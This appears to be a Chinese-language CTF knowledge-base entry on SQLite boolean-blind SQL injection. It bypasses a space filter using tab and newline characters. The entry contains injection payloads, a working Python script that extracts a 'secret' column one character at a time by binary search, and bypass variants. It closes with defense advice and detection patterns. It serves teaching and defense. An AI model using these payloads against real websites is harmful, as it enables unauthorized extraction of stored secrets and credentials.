---
id: web-generic-sqli-sqlite-boolean-blind-tab-bypass
title: SQLite 布尔盲注：%09 代替空格 + substr 二分提取 secret
type: scenario
domain: web
path: web/generic/sqli
technique: sqlite-boolean-blind-tab-bypass
aliases:
- SQLite 布尔盲注
- '%09 绕过空格过滤'
- substr 二分注入
- group_concat secret
- check.php 注入
tags:
- sqli
- sqlite
- blind
- boolean
- waf-bypass
- tab
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:47+08:00'
  notes: 已对照原文盲注脚本与结果截图核对；secret 与 flag 提取一致；PoC 未复跑。
---

## 一句话结论

当 SQLite 查询把用户名拼进 `WHERE` 且只过滤空格、页面只有“活跃/不活跃”两种状态时，可用 `%09`（制表符）或 `%0a`（换行）代替空格，构造 `substr((SELECT ...),i,1) > 'x'` 的布尔条件，按字符二分把 `secret` 逐位跑出来。

## 原理

- SQL 词法分析把空格、制表符、换行、回车等都视为空白分隔符；很多 WAF/过滤只替换普通空格 `0x20`，用 `%09`/`%0a`/`%0d` 仍能分隔关键字，SQL 语义不变。
- 页面只有两种回显（如登录成功显示“活跃”，失败显示其他内容），构成布尔 oracle：条件为真与为假时响应不同，攻击者不需要错误信息或时间延迟。
- SQLite 的 `substr(X,i,1)` 返回字符串第 i 个字符；`group_concat(secret)` 把多行 `secret` 拼成一个字符串。用 `substr(...) > 'm'` 做字典序比较，每次把候选字符区间二分，约 7 次请求确定一个字符（ASCII 32–127）。
- 表结构可从 `sqlite_master` 读取：`SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'`；列名可从 `SELECT sql FROM sqlite_master WHERE tbl_name='users'` 获取；本题 `users` 表含 `secret` 列。
- 注入点在 `name=admin' ... --`：先闭合单引号，再用 `AND`/`OR` 接布尔条件，最后 `--` 注释掉原查询剩余部分。`admin' or 1=1--` 可先验证注入与空格过滤；`admin'%09or%091=1--` 成功说明 tab 可用。
- 该手法成立的核心是“响应差异 + 可控布尔表达式”；不依赖报错、堆叠查询或文件权限。

## 触发条件

- 后端为 SQLite（或兼容 `substr` 的数据库），查询把用户输入拼接进 SQL，未使用参数化查询。
- 过滤只处理普通空格或少量关键字，未把 tab/换行/注释符纳入词法级检测。
- 页面存在稳定的真/假两种响应（文案、状态码、长度、跳转均可）。
- 攻击者能访问注入点并有足够请求预算做逐字符二分。

## 利用步骤

1. 用 `admin' or 1=1--` 观察是否返回“活跃”；若被空格过滤，改 `admin'%09or%091=1--`。
2. 枚举表：`admin'%09and%09substr((SELECT%09group_concat(tbl_name)%09FROM%09sqlite_master%09WHERE%09type='table'),1,1)>'a'--`，或用 `sqlite_master` 的 `sql` 列读取建表语句。
3. 确认 `users` 表与 `secret` 列；用 `group_concat(secret)` 把目标值聚合。
4. 写脚本对每个位置 i 在 ASCII 32–127 之间二分：条件为真则 `head=mid+1`，否则 `tail=mid`，最终 `chr(head)` 即该位字符。
5. 拼接所有字符，去掉 `group_concat` 的分隔符（默认逗号）并按需处理 URL 编码；遇到 `%` 等特殊字符时用 `requests` 的 params 自动编码，或把 `%` 写成 `%25`。

## PoC

```python
import requests

base = "http://target/check.php"
result = ""
for i in range(1, 100):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        payload = (
            "admin'\tand\tsubstr((SELECT\ngroup_concat(secret)\nFROM\nusers),"
            f"{i},1)>'{chr(mid)}'--"
        )
        r = requests.get(base, params={"name": payload}, timeout=5)
        if "活跃" in r.text:
            lo = mid + 1
        else:
            hi = mid
    if lo == 32:
        break
    result += chr(lo)
    print(result)
```

等价的手工 URL（`%09` 为 tab，`%0a` 为换行）：

```text
/check.php?name=admin'%09and%09substr((SELECT%0agroup_concat(secret)%0aFROM%0ausers),1,1)>'m'--
```

## 变体与关联

- 变体：空格过滤可用 `%09`、`%0a`、`%0d`、`/**/`、括号、`+`（URL 中空格）等替代；关键字过滤可用大小写、注释拆分、`||` 拼接绕过。
- 变体：没有 `secret` 列时改查 `password`、`flag`、`sqlite_master.sql`；SQLite 还可用 `sqlite_version()`、`load_extension()`（若开启）等。
- 变体：布尔 oracle 换成时间盲注（`randomblob`/`heavy query`）或错误盲注；二分也可换成逐字符线性遍历。
- 关联：[[web-generic-sqli-blind-filter-bypass-functions]]（盲注过滤绕过）、[[web-generic-sqli-exists-left-boolean-oracle]]（布尔 oracle 构造）、[[web-generic-sqli-sqlite-union-values-select-filter-bypass]]（SQLite 其他注入形态）。
- 边界：参数化查询、严格白名单、SQLite 只读/最小权限、响应无差异或请求被限速时，本手法失效。

## 检测与防御

- 使用参数化查询/预编译语句，禁止把用户输入拼接进 SQL；对 `name` 等字段做类型与长度校验。
- 不要依赖空格黑名单；WAF 应在词法/语法层识别 `%09`、`%0a`、注释符、`substr`、`sqlite_master` 等组合，但 WAF 不能替代参数化。
- 统一错误/成功响应，避免布尔 oracle；对同一 IP/会话的异常高频请求做限速与告警。
- 数据库最小权限：Web 账号只授予必要表的 SELECT/INSERT，禁用 `sqlite_master` 之外的敏感元数据访问（SQLite 难以完全限制，重点在应用层）。
- 检测：请求参数出现 `%09`、`%0a`、`substr(`、`group_concat(`、`sqlite_master`、连续 `--`；同一参数在短时间内字符级变化；响应长度/文案呈二分模式。
